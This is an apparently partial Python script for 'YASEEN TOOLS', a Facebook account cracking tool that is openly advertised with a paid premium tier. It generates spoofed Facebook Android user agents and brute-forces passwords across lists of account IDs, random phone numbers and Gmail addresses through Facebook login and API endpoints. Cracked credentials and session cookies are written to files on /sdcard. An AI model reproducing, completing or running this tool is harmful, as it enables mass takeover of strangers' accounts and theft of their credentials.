#!/usr/bin/python3
#creater: 
#____________[ IMPORTING MODULES ]________@>>
from os import path
...
#____________[ RANDOM VALUES FOR UA ]________@>>
...
#____________[ RANDOM USERAGENT APPEND ]________@>>
ugen=[]
...
#____________[ USERAGENT DEF ]________@>>
def getUA():
  FBAV="360.0.0.7.53"
  FBBV="485850575"
  ...
  ua=f"[FBAN/FB4A;FBAV/{FBAV};FBBV/{FBBV};"+"FBDM/{density=4.0,width=1440,height=2560};"+f"FBLC/{FBLC};FBCR/{FBCR};FBMF/{FBMF};FBBD/{FBBD};FBPN/{FBPN};FBDV/{FBDV};FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]"
  return ua
def UsmiUA():
...
#____________[ COLOURS ]________@>>
RED = '\033[1;91m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
EXTRA ='\x1b[38;5;208m'
#____________[ LOGO ]________@>>
logo = f"""{WHITE}
#     #    #     #####  ####### ####### #     # 
  #   #    # #   #     # #       #       ##    # 
   # #    #   #  #       #       #       # #   # 
    ...
    WELCOME TO YASEEN TOOLS 🙂🥀
{WHITE} [ AUTHOR ]      : [ Mr YASEEN ]
{WHITE} [ FACEBOOK ]  : [ YASEEN ]
{WHITE} [ WhatsApp ]    : [ 03258308486 ]
{WHITE} [ Version   ]       : [ 1.0 ]

{WHITE}================================================

{WHITE}================================================="""
#____________[ LOOP / LIST ]________@>>
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
#____________[ COOKIE LOGIN ]________@>>
def login():
        ...
        try:
                ...
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
#____________[ PUBLIC CRACK ]________@>>
def public():
        usrr=[]
        os.system('clear');print(logo)
        try:
        ...
        try:
                ...
                time.sleep(3)
                public()
#____________[ MAIN MENU ]________@>>
def menu():
        try:
                os.system('clear');print(logo)
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        print(f'{WHITE}----------------------------------------------');print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");print(f'{WHITE}----------------------------------------------');print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
                        print(f'{WHITE}----------------------------------------------')
                        input(" Choose Option : ")
                        print(f'{WHITE}----------------------------------------------')
                        ...
                        print(f'{WHITE}----------------------------------------------')
                        tks = ("Hi Usmii Sir, I Need To Buy Your Paid Usmii PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python MrYaseen.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                ...
                exit()
#____________[ PAK RANDOM CRACK ]________@>>
def pak():
                user=[]
                os.system('clear');print(logo)
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Usmii:     
                        os.system('clear');print(logo)
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Usmii.submit(rndm,ids,passlist)
                print('\033[1;37m')
                print(f'{WHITE}----------------------------------------------')
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                ...
                input(' Press enter to back ')
                os.system('python MrYaseen.py')
#____________[ BAN RANDOM CRACK ]________@>>
def bd():
                user=[]
                os.system('clear');print(logo)
                ...
                input(' Press enter to back ')
                os.system('python MrYaseen.py')
#____________[ GMAIL CRACK ]________@>>
def gmail():
                ...
                input(' Press enter to back ')
                os.system('python MrYaseen.py')
#____________[ MBASIC CRACK ]________@>>
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MrYaseen-Fire] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Usmii=session.cookies.get_dict().keys()
                        if "c_user" in Usmii:
                                coki=session.cookies.get_dict()
                                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                print('\r\r\033[1;32m [MrYaseen-OK] %s | %s'%(ids,pas))
                                print("Cookie: "+coki)
                                open('/sdcard/MrYaseen-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Usmii:
                                if 'y' in pcp:
                                        print('\r\r\033[95;1m [CP-CP] '+ids+' | '+pas+'\033[1;97m')
...
def rndUA():
    ...
    FBBV=random.randint(222222222,599999999)
    FBAVM=random.randint(50,10000)
    suffix="[FBAN/{fban};FBAV/{facebook_version};FB4A;FBAV/311.0.0.40.119;FBBV/227842969;FBDM/{{density={density:2.0113},width={width},height={height}}};FBLC/it_IT;FBRV/{fbrv};FBCR/{fbcr};FBMF/{model_};FBBD/{fbbd};FBPN/{fbpn};FBDV/{model_.replace(' ', '_')};FBSV/{fbsv};FBOP/1;FBCA/x86:armeabi-v7a;FBNT/{network_type};FBCN/{network_carrier};FBSR/{ip_address};]"
    return prefix+suffix
    
#____________[ METHOD B-API CRACK ]________@>>
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MrYaseen-OK] '+ids+' | '+pas+'\033[1;97m'+coki+'')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\033[95;1m [OK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CP-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                        ...
                        pass
#____________[ BAPI (1) CRACK ]________@>>
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [OK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/OK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        ...
                        pass
#____________[ RANDOM BAPI CRACK ]________@>>
def rndm(ids,passlist):
                try:
                        ...
                        for pas in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = "Dalvik/1.6.0 [FBAN/FB4A;FBAV/355.0.0.6.103;FBBV/124;FBDM/{density=3.0,width=1242,height=2208};FBLC/it_IT;FBRV/124.0.0.0.52;FBCR/Afghan Wireless;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix PR652B;FBSV/6.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MrYaseen-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MrYaseen-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MrYaseen-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MrYaseen-OK] '+uid+' | '+pas+'\033[1;97m')
